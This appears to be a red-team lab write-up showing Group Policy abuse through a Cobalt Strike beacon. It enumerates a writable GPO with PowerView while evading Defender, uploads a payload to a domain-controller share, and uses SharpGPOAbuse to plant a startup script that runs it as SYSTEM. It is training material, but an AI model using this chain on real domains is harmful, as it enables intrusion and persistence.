in order to `enumerate` GPO with `Windows Defender` on first import `PowerView.ps1`
```powershell
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[+] host called home, sent: 143801 bytes
```
this section was complated on `WKSTN-2` as `DEV\bfarmer`

use `powerpick` to utilize `powershell` commands while bypassing `Windows Defender`
```powershell
beacon> powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
[+] host called home, sent: 10 bytes
[*] Tasked beacon to run: Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" } (unmanaged)
[+] host called home, sent: 138048 bytes
[+] received output:


AceType               : AccessAllowed
ObjectDN              : CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=c
                        yberbotic,DC=io
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
OpaqueLength          : 0
ObjectSID             : 
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-569305411-121244042-2357301523-1107
AccessMask            : 131127
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

one result was returned, next we `resolve` the GPO name and the `SID` of the principal.
```powershell
[12/12 18:39:28] beacon> powerpick Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath
[12/12 18:39:28] [+] host called home, sent: 10 bytes
[12/12 18:39:28] [*] Tasked beacon to run: Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath (unmanaged)
[12/12 18:39:28] [+] host called home, sent: 138048 bytes
[12/12 18:39:32] [+] received output:

displayname    gpcfilesyspath                                                                      
-----------    --------------                                                                      
Vulnerable GPO \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3B...
```
utilized `SID` from two commands ago to identify the actual `groupname` of `SID`
```powershell
[12/12 19:03:24] beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
[12/12 19:03:24] [*] Tasked beacon to run: ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107 (unmanaged)
[12/12 19:03:24] [+] host called home, sent: 138058 bytes
[12/12 19:03:28] [+] received output:
DEV\Developers
```
This shows us that members of the ``"Developers"`` group can modify ``"Vulnerable GPO"``.

We also want to know which OU(s) this GPO applies to, and by extension which computers are in those OUs.  GPOs are linked to an OU by modifying the `gPLink` property of the OU itself.  The `Get-DomainOU` cmdlet has a handy `-GPLink` parameter which takes a GPO GUID.

```powershell
[12/12 19:04:42] beacon> powerpick Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName
[12/12 19:04:42] [+] host called home, sent: 10 bytes
[12/12 19:04:42] [*] Tasked beacon to run: Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName (unmanaged)
[12/12 19:04:43] [+] host called home, sent: 138048 bytes
[12/12 19:04:46] [+] received output:

distinguishedname                         
-----------------                         
OU=Workstations,DC=dev,DC=cyberbotic,DC=io
```
Finally, to get the computers in an OU, we can use `Get-DomainComputer` and use the OU's distinguished name as a search base.
```powershell
[12/12 19:05:55] beacon> powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName
[12/12 19:05:55] [+] host called home, sent: 10 bytes
[12/12 19:05:55] [*] Tasked beacon to run: Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName (unmanaged)
[12/12 19:05:55] [+] host called home, sent: 138048 bytes
[12/12 19:05:59] [+] received output:

dnshostname              
-----------              
wkstn-1.dev.cyberbotic.io
wkstn-2.dev.cyberbotic.io
```
To modify a GPO without the use of GPMC (Group Policy Management Console), we can modify the associated files directly in SYSVOL (the gpcFileSysPath).
```powershell
[12/12 19:06:56] beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}
[12/12 19:06:56] [*] Tasked beacon to list files in \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}
[12/12 19:06:56] [+] host called home, sent: 110 bytes
[12/12 19:06:56] [*] Listing: \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     12/13/2022 12:35:45   Machine
          dir     12/13/2022 12:35:45   User
 59b      fil     12/13/2022 12:35:45   GPT.INI
```
We can do that manually or use an automated tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse), which has several abuses built into it.

# File Upload
on `WKSTN-2` as `bfarmer` used commands below:

`cd` to `DC-2` share folder
```powershell
beacon> cd \\dc-2\software\
[*] cd \\dc-2\software\
[+] host called home, sent: 24 bytes
```
`ls` the directory
```powershell
beacon> ls
[*] Tasked beacon to list files in .
[+] host called home, sent: 19 bytes
[*] Listing: \\dc-2\software\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/24/2022 10:47:00   elastic-agent-windows
          dir     08/24/2022 10:38:51   Sysmon
 1mb      fil     08/16/2022 12:37:56   LAPS.x64.msi
```
`upload` `dns_x64.exe`
```powershell
[12/20 20:44:26] beacon> upload
[12/20 20:45:11] [*] Tasked beacon to upload C:\Payloads\dns_x64.exe as dns_x64.exe
[12/20 20:45:11] [+] host called home, sent: 328727 bytes
```
ensure that it was uploaded
```powershell
[12/20 20:45:16] beacon> ls
[12/20 20:45:16] [*] Tasked beacon to list files in .
[12/20 20:45:16] [+] host called home, sent: 19 bytes
[12/20 20:45:16] [*] Listing: \\dc-2\software\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/24/2022 10:47:00   elastic-agent-windows
          dir     08/24/2022 10:38:51   Sysmon
 321kb    fil     12/20/2023 20:45:12   dns_x64.exe
 1mb      fil     08/16/2022 12:37:56   LAPS.x64.msi
```
utilize command below to `add` and `execute` `startup.bat`, the `script` starts the `dns_x64.exe` 
Here's an example using a Computer Startup Script.  It will put a startup script in SYSVOL that will be executed each time an effected computer starts (which incidentally also acts as a good persistence mechanism).
```powershell
[12/20 20:48:14] beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"
[12/20 20:48:15] [*] Tasked beacon to run .NET program: SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"
[12/20 20:48:15] [+] host called home, sent: 215546 bytes
[12/20 20:48:16] [+] received output:
[+] Domain = dev.cyberbotic.io
[+] Domain Controller = dc-2.dev.cyberbotic.io
[+] Distinguished Name = CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io

[12/20 20:48:16] [+] received output:
[+] GUID of "Vulnerable GPO" is: {5059FAC1-5E94-4361-95D3-3BB235A23928}
[+] Creating new startup script...

[12/20 20:48:16] [+] received output:
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new startup script. Wait for the GPO refresh cycle.
[+] Done!

```
on `dc-2` ensuring that the `startup.bat` script was uploaded correctly
![[Pasted image 20231220163904.png]]
Log into the console of Workstation 1 and run `gpupdate /force` from a Command Prompt.  Then reboot the machine.  After it starts up, the DNS Beacon will execute as SYSTEM.

![[Pasted image 20231220164045.png]]